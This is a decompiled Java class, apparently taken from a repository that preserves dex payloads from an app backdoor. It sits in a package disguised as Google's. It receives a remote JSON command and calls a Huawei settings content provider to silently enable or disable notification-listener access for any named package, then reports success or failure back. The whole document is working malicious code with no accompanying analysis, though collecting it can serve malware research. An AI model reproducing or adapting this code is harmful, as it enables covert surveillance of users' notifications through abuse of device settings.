package com.google.android.sd.biz_dynamic_dex.hw_notification_listener;

import android.content.Context;
import android.net.Uri;
import android.os.Bundle;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class HWNotificationListenerExecutor extends DynamicCmdExecutor {
  private final int CMD = 70;
  
  private void doAccess(Context paramContext, String paramString1, String paramString2, boolean paramBoolean) {
    CmdData cmdData = new CmdData(70, paramString1, "client");
    try {
      Uri uri = Uri.parse("content://com.android.settings.open_to_externalapps");
      Bundle bundle = new Bundle();
      if (paramBoolean) {
        paramString1 = "enable";
      } else {
        paramString1 = "disable";
      } 
      bundle.putString("operation", paramString1);
      paramContext.getContentResolver().call(uri, "changeNotificationAccessSettings", paramString2, bundle);
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, null, null));
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("exception_");
      stringBuilder.append(exception.getMessage());
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, stringBuilder.toString(), null));
      return;
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    try {
      if (TextUtils.isEmpty(paramString))
        return; 
      JSONObject jSONObject = new JSONObject(paramString);
      String str = jSONObject.optString("uuid");
      boolean bool = jSONObject.optBoolean("access");
      doAccess(paramContext, str, jSONObject.optString("package"), bool);
      return;
    } catch (Exception exception) {
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\a3937709-b9cc-48fd-8918-163c9cb7c2df-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_notification_listener\HWNotificationListenerExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */